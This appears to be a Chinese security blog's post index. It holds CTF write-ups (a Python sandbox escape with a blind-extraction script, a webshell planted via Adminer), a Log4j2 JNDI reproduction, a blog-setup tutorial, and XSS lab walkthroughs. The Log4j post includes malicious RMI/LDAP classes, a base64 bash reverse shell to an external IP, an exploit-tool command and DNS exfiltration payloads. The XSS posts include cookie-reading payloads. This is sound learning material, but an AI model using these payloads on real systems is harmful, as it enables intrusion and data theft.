[{"categories":["CTF"],"content":"ezoj 访问 /source 读取源码，大概就是会把 python 代码写到一个新的 py 文件然后进行执行，有个 hook 函数 import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\"import\",\"time.sleep\",\"builtins.input\",\"builtins.input/result\"]: raise RuntimeError sys.addaudithook(audit_checker)绕过 addaudithook 可以参考这篇文章： https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html 最后构造下面命令进行命令执行， import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"ls /\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)但是没有执行结果回显，因为给了 time.sleep 可以使用，本来想直接在这个 py 沙箱进行时间盲注的但是无法把结果赋值变量，所以重新写个文件 /tmp/1.py ，再在这个 py 文件进行盲注，构造脚本： import base64 import requests import time flag='' strings = \"qwertyuiopasdfghjklzxcvbnm1234567890{}-\" payload1=f\"\"\" import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"python3 /tmp/1.py\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) \"\"\" for i in range(1, 50): for j in strings: poc1=f\"\"\"import time import os if os.popen('whoami').read({i})[{i}-1] == \"{j}\": time.sleep(2)else: print(\"\") \"\"\" poc2=base64.b64encode(poc1.encode('utf-8')).decode() payload2 = f\"\"\" import _posixsubprocess import os _posixsubprocess.fork_exec([b\"/bin/sh\",\"-c\", \"echo '{poc2}'|base64 -d\u003e/tmp/1.py\"], [b\"/bin/sh\"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) \"\"\" resp1 = requests.post( \"http://172.29.230.100:8089/api/submit\", json={\"problem_id\": \"0\", \"code\": payload2}, ) start_time = time.time() resp2 = requests.post( \"http://172.29.230.100:8089/api/submit\", json={\"problem_id\": \"0\", \"code\": payload1}, ) end_time = time.time() # 记录请求结束时间 delay = end_time - start_time # 计算延迟时间 if delay \u003e 2: flag += j print(flag) break else: flag += \"\\n\" break本地效果， 最后盲注获得 flag。 ","date":"2025-02-25","objectID":"/posts/aliyunctf/:1:0","tags":["CTF"],"title":"AliyunCTF 2025 部分wp","uri":"/posts/aliyunctf/"},{"categories":["CTF"],"content":"打卡OK 开题就一个登录界面，不知道 code 是什么感觉爆破也是白爆破，进行目录扫描 访问 /index.php~ 发现可以查看 index.php 源码，尝试其他 php 文件名后加个~都可以读取源码，在 login.php 源码得到个数据库账户密码， 然后再在 ok.php 源码发现存在 adminer_481.php 路径 访问路径是个数据库管理服务， 连接后可以添加账户进行登录，但是登录后审半天也不知道想考个什么。 然后看到还能执行 sql 语句，尝试 sql 写马，但是在写马时报错了，显示权限不足， 最后发现还可以 root 账户进行登录，默认密码就为 root， 成功后访问/shell.php ","date":"2025-02-25","objectID":"/posts/aliyunctf/:2:0","tags":["CTF"],"title":"AliyunCTF 2025 部分wp","uri":"/posts/aliyunctf/"},{"categories":["javasec"],"content":"Apache_log4j2（CVE-2021-44228）漏洞复现 ","date":"2025-02-09","objectID":"/posts/log4j2/:0:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"Log4j2 介绍 log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。 ","date":"2025-02-09","objectID":"/posts/log4j2/:1:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"漏洞介绍 Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。 在java中最常用的日志框架是log4j2和logback，其中log4j2支持lookup功能（查找搜索），这也是一个非常强大的功能，设计之初的目的也是为了方便开发者调用 例如当开发者想在日志中打印今天的日期，则只需要输出${data:MM-dd-yyyy}，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。 表达式除了支持日期，还支持输出系统环境变量等功能，这样极大的方便了开发者。但是安全问题往往就是因为“图方便”引起的，毕竟设计者也是需要在安全性和用户体验之间做个平衡。 其实打印日期，打印系统变量这种对系统而言构不成什么威胁，最终要的原因是log4j还支持JNDI协议。 ","date":"2025-02-09","objectID":"/posts/log4j2/:2:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"影响版本 2.0 \u003c= Apache log4j2 \u003c= 2.14.1 ","date":"2025-02-09","objectID":"/posts/log4j2/:3:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"环境搭建 pom.xml \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.12\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003elog4j2 的一些实现方式，什么 xml，yaml，properties 等很多方式。这里，我们简单用 xml 的方式来实现，文件如下，默认文件名为log4j2.xml， \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!-- log4j2 配置文件 --\u003e \u003c!-- 日志级别 trace\u003cdebug\u003cinfo\u003cwarn\u003cerror\u003cfatal --\u003e\u003cconfiguration status=\"info\"\u003e \u003c!-- 自定义属性 --\u003e \u003cProperties\u003e \u003c!-- 日志格式(控制台) --\u003e \u003cProperty name=\"pattern1\"\u003e[%-5p] %d %c - %m%n\u003c/Property\u003e \u003c!-- 日志格式(文件) --\u003e \u003cProperty name=\"pattern2\"\u003e =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n \u003c/Property\u003e \u003c!-- 日志文件路径 --\u003e \u003cProperty name=\"filePath\"\u003elogs/myLog.log\u003c/Property\u003e \u003c/Properties\u003e \u003cappenders\u003e \u003cConsole name=\"Console\" target=\"SYSTEM_OUT\"\u003e \u003cPatternLayout pattern=\"${pattern1}\"/\u003e \u003c/Console\u003e \u003cRollingFile name=\"RollingFile\" fileName=\"${filePath}\" filePattern=\"logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz\"\u003e \u003cPatternLayout pattern=\"${pattern2}\"/\u003e \u003cSizeBasedTriggeringPolicy size=\"5 MB\"/\u003e \u003c/RollingFile\u003e \u003c/appenders\u003e \u003cloggers\u003e \u003croot level=\"info\"\u003e \u003cappender-ref ref=\"Console\"/\u003e \u003cappender-ref ref=\"RollingFile\"/\u003e \u003c/root\u003e \u003c/loggers\u003e\u003c/configuration\u003e然后再写一个实际应用的 demo，比如从数据库获取到了一个 username 为 “admin”，要把它登录进来的信息打印到日志里面，这个路径一般有一个 /logs 的文件夹的。 package org.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class Main { public static void main(String[] args) { Logger logger = LogManager.getLogger(LongFunction.class); String username = \"${java:os}\"; if (username != null ) { logger.info(\"User {} login in!\", username); } else { logger.error(\"User {} not exists\", username); } } }运行结果， 上面说了 log4j2 会把 ${} 包裹内容进行单独处理，利用 lookup 功能进行查找。Log4j2 内置了多个 Lookup 实现，每个 Lookup 都有不同的用途和功能。以下是一些常见的 Lookup 类型： ${date}：获取当前日期和时间，支持自定义格式。 ${pid}：获取当前进程的 ID。 ${logLevel}：获取当前日志记录的级别。 ${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。 ${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。 ${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。 ${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。 ${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。 这里把上面的 admin 替换为 ${sys:user.dir}，再次运行， 而造成漏洞是因为这里的 lookup 它是基于 jndi 的，而 jndi 里面我们早在之前说过直接调用 lookup() 是会存在漏洞的。 ","date":"2025-02-09","objectID":"/posts/log4j2/:4:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"漏洞复现 自己编写一个 RMIServer， package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RMI_Server { void register() throws Exception{ LocateRegistry.createRegistry(1099); Reference reference = new Reference(\"RMI_POC\",\"RMI_POC\",\"http://ip:6666/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference); Naming.bind(\"hello\",refObjWrapper); System.out.println(\"START RUN\"); } public static void main(String[] args) throws Exception { new RMI_Server().register(); } }搭建好恶意的 RMI 服务器，并且在远端服务器上放置恶意类，RMI_POC.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import java.util.Hashtable; public class RMIHello extends UnicastRemoteObject implements ObjectFactory { public RMIHello() throws RemoteException { super(); try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } }编译为 class 字节码，然后启动 http 监听， payload：${jndi:rmi://localhost:1099/hello}，最后成功执行， 然后再在 vulhub 靶场复现一次，搭建好靶场后访问 8983 端口，传入下面 payload 验证漏洞 /solr/admin/cores?action=${jndi:ldap://620de897.log.dnslog.sbs.} dns 收到请求， 这里打 Ladp，因为是本地搭建的靶场，所以本地搭建 LdapServer 服务，然后在远程端进行 http 监听，远程端的恶意利用类改为反弹 shell 的命令， import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.util.Hashtable; public class LDAP_POC implements ObjectFactory { public LDAP_POC() throws Exception{ try { Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } }传入 payload， ${jndi:ldap://ip:9999/LDAP_POC}成功反弹 shell 尝试利用工具来进行攻击，工具下载地址：https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0，然后构建命令进行监听， java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}\" -A \"47.109.156.81\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwNi41My4yMTIuMTg0LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i} 就是 exec 里面执行的命令，-A 参数是攻击机 ip， 然后根据 jdk 版本选择 payload 传入，这个 jdk 版本可以通过命令 ${jndi:rmi://${sys:java.version}.vbdpkn.ceye.io} 进行 dns 外带查看，这里选择 jdk1.8 版本的， ${jndi:ldap://47.109.156.81:1389/nvxwvy}最后也能成功反弹 shell ","date":"2025-02-09","objectID":"/posts/log4j2/:5:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"漏洞分析 来到 PatternLayout#toSerializable 方法，对 formatters 进行循环处理， 在循环到第七次时，跟进到 format 方法，先判断是否是 Log4j2 的 lookups 功能。这里我们是 lookups 功能，所以可以继续往下走。会遍历 workingBuilder 来进行判断；如果 workingBuilder 中存在${，那么就会取出从 $ 开始知道最后的字符串，这一步 最后得到 value 为， 继续跟进 replace() 方法，replace() 方法里面调用了 substitute() 方法，这里就是将 ${} 中间的内容取出来，然后又会调用 this.subtitute 来处理。最后调用到 resolveVariable 方法， resolver解析时支持的关键词有[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]，而我们这里利用的jndi:xxx后续就会用到JndiLookup这个解析器 这个 lookup() 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 rmi 服务的时候，是调用原生的 lookup() 方法的，是存在漏洞的。 最后成功执行。 ","date":"2025-02-09","objectID":"/posts/log4j2/:6:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":["javasec"],"content":"漏洞修复 更新log4j至 rc2 配置防火墙策略，禁止主动连接外网设备 升级受影响的应用及组件 过滤相关的关键词，比如${jndi://*} 限制JNDI默认可以使用的协议 限制可以通过LDAP访问的服务器和类 参考：https://www.freebuf.com/articles/web/341857.html 参考：https://www.freebuf.com/articles/web/380568.html ","date":"2025-02-09","objectID":"/posts/log4j2/:7:0","tags":["java","漏洞复现"],"title":"Log4j2 漏洞复现","uri":"/posts/log4j2/"},{"categories":null,"content":"Github Pages博客搭建教程 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:0:0","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"Github Pages+ Hexo 搭建个人博客 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:0","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"一、下载 Git git是一个包管理工具，在linux是自带的，windows上需要下载。 参考：https://www.cnblogs.com/xueweisuoyong/p/11914045.html ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:1","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"二、下载 Node.js \u0026 npm 下载参考：https://blog.csdn.net/weixin_38610651/article/details/108721957 Node.js 默认配置了 npm，因此不需要额外下载，可以根据需要配置 npm下载路径。 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:2","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"三、安装 Hexo 执行命令 npm install hexo-cli -g执行 hexo -version 查看是否安装成功， ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:3","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"四、本地预览 新建一个用于存储博客数据的目录(如 D:\\hexo-blog)并确保该目录为空，随后在终端中执行， hexo init （文件名）（可选，默认本文件夹）等待一段时间，即可成功初始化。此时可使用 hexo s -g 本地预览初始化成功的博客 g是部署，s是本地启动本地预览效果如下： ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:4","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"五、部署到 Github 上 详细看参考：https://blog.csdn.net/yaorongke/article/details/119089190 访问地址效果： ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:5","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"六、主题配置 这里选择下载主题 butterfly， 跟多主题详细配置参考：butterfly主题配置 主题魔改参考：butterfly主题魔改 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:1:6","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"Github Pages+ Hugo 搭建个人博客 参考：https://www.shaohanyun.top/posts/env/blog_build2/ 参考：https://github.com/lazeroffmichael/example-hugo-blog 参考：https://lianpf.github.io/posts/other/tools-docs-hugo-papermod/ ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:0","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"一、主题配置 把之前的 gaorenyusi.github.io 仓库清空，然后下载 hugo，执行下面命令生成网站主文件 hugo new site blog hugo new site blog --format yaml然后下载主题（这里用的是LoveIt主题，但还是可以参考上面链接） cd blog git clone https://github.com/dillonzq/LoveIt.git themes/LoveIt可以把 exampleSite 目录中的配置文件 hugo.toml 复制到主文件，然后根据需要修改 hugo.toml 我的配置文件： hugo.toml. 最后执行下面命令进行本地预览 hugo server -D-D 是生成 public 目录，然后访问地址 http://localhost:1313 进行本地访问， 更多主题配置: LoveIt主题配置 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:1","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"二、部署到 github pages 在 public 目录下执行下面命令即可， git init git add . git commit -m \"first commit\" git branch -M main git remote add origin 仓库地址 git push -u origin main -f","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:2","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":null,"content":"三、Action 自动提交博客 什么是Github Action?\rGithub Action 是 Github 提供的 CI 系统，可以让用户编写脚本，并在触发指定的操作后（比如新 commit push 到仓库），自动触发脚本。它可以： 编译项目 测试项目 登陆远程服务器 发布服务 等等…… 具体配置参考：https://ratmomo.github.io/p/2024/06/%E4%BD%BF%E7%94%A8-hugo–github-pages-%E9%83%A8%E7%BD%B2%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/#%E7%95%AA%E5%A4%96%E7%AF%87%E4%BD%BF%E7%94%A8github-action%E8%87%AA%E5%8A%A8%E5%8F%91%E5%B8%83%E5%8D%9A%E5%AE%A2 ","date":"2025-02-08","objectID":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/:2:3","tags":["博客部署"],"title":"Github Pages博客搭建教程","uri":"/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"},{"categories":["漏洞学习"],"content":"DOM型XSS学习 Ps：之前一直没好好学过 xss，特别是 dom 型 xss 快忘得差不多了，所以今天抽空简单补补，也不是学得很深入。 ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:0:0","tags":["xss"],"title":"DOM型XSS学习","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["漏洞学习"],"content":"DOM 型 XSS 是什么 DOM型XSS是基于DOM文档对象模型的一种漏洞，DOM 型 XSS 并不会和后台进行交互。由客户端的脚本程序通过DOM动态地检查和修改页面内容，从客户端获得DOM中的数据（如从URL中获取数据）并在本地进行执行。 常见的危险危险函数如： document.URL，document.write，location，window.location。 如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互： \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eDOM XSS\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript\u003e var pos=document.URL.indexOf(\"name=\")+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length))); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003edocument.URL 获取用户输入，代码中未经过任何过滤就传递给了 document.write 输出到当前页面中。那么传入 name=\u003cscript\u003ealert (111)\u003c/script\u003e 就可以触发 xss 漏洞 是不是感觉很像反射型 xss，只是不同的是这里不会后端进行交互，可以看到 dom 中已经插入了我们的元素， 但是查看源码是没有的。 ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:1:0","tags":["xss"],"title":"DOM型XSS学习","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["漏洞学习"],"content":"常见的危险函数 下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。 Sources document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname Sinks 直接执行脚本类 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) 写HTML页面类 document.write(…) document.writeln(…) element.innerHTML(…) 直接修改DOM类 document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) 替换文档URL类 document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) 打开/修改窗口类 document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname) 当然，除此之外，还有比较细节的特性这里就不列举了，可自行研究。 相关例子参考：http://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/ ","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:2:0","tags":["xss"],"title":"DOM型XSS学习","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["漏洞学习"],"content":"DVWA 的 DOM 型 XSS 开题： 难度：一、简单 由于是 dom 型 xss 直接查看其元素。 看到先是获取参数 defalut 的值然后把其写入 \u003coptinon\u003e 标签中，然后查看源码发现没有任何过滤 \u003c?php # No protections, anything goes ?\u003e 所以传参?default=\u003cscript\u003ealert(\"aaa\")\u003c/script\u003e 执行 发现元素已经成功插入 难度：二、中等 原理是一样的，就是多做了些过滤，查看源码 \u003c?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) \u0026\u0026 !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \"\u003cscript\") !== false) { header (\"location: ?default=English\"); exit; } } ?\u003e 意思就是我们输入的参数值中不能有 \u003cscript 标签，那么还可以用其它的标签 HTML 的 \u003c img \u003e 标签定义 HTML 页面中的图像，该标签支持 onerror 事件，在装载文档或图像的过程中如果发生了错误就会触发。使用这些内容构造出 payload 如下，因为我们没有图片可供载入，因此会出错从而触发 onerror 事件输出 cookie。所以构造： ?default=English\u003c/option\u003e\u003c/select\u003e\u003cimg src = 1 onerror = alert(document.cookie)\u003e或者 \u003e\u003c/option\u003e\u003c/select\u003e\u003ciframe onload=alert(/xss/)\u003e难度：三、困难 源码： \u003c?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) \u0026\u0026 !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \"French\": case \"English\": case \"German\": case \"Spanish\": # ok break; default: header (\"location: ?default=English\"); exit; } } ?\u003e 发现是个白名单，只允许输入指定的参数，其他的都会跳转为 ?default=English 但这里没过滤 \u003cscript\u003e 标签。 简单构造： English #\u003cscript\u003ealert(document.cookie)\u003c/script\u003e","date":"2024-10-31","objectID":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/:3:0","tags":["xss"],"title":"DOM型XSS学习","uri":"/posts/dom%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0/"},{"categories":["漏洞学习"],"content":"XSS靶场 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:0:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-1 发现有个name传参，看源代码 get 传参 name 的值 test 插入了 html 里头 然后应用 alter 函数就能触发第二关，那么传入 \u003cscript\u003ealert()\u003c/script\u003e ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:1:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-2 传入参数值 \u003cscript\u003ealert()\u003c/script\u003e查看源代码 \u003c\u003e符号被转义，但是下面一句是正常的，传入的 “\u003e和\u003c“与前后形成闭合。从而被当作标签处理，所以传入 \"\u003e\u003cscript\u003ealert()\u003c/script\u003e\u003c\"","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:2:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-3 查看源码发现上下都被转义了， 有 input 标签，那么就 onfocus 事件绕过，所以传入 ' onfocus=javascript:alert() '单引号和前后闭合，javascript: 是伪协议，传入后再次点击输入框触发。 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:3:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-4 查看源代码发现 input 标签会自动删除尖括号，继续用level-3的方法，改成双引号闭合。记得空格 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:4:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-5 查看源代码， 直接看源码吧，发现函数 strtolower 会转为小写，所以不能大小写绕过。前几关的方法也用不了了，那么这里传入 \"\u003e\u003ca href=javascript:alert()\u003exxx\u003c/a\u003e\u003c\" ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:5:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"level-6 比上一关多过滤了 href ，但这关可以使用大小写绕过 因为str_replace()函数不区分大小写，这里又没加大写转小写的函数 ","date":"2024-10-20","objectID":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/:6:0","tags":["xss"],"title":"XSS靶场训练","uri":"/posts/xss%E9%9D%B6%E5%9C%BA%E8%AE%AD%E7%BB%83/"},{"categories":["漏洞学习"],"content":"leve-7 查看源码发现会把关键字替换为空。可以双写绕过 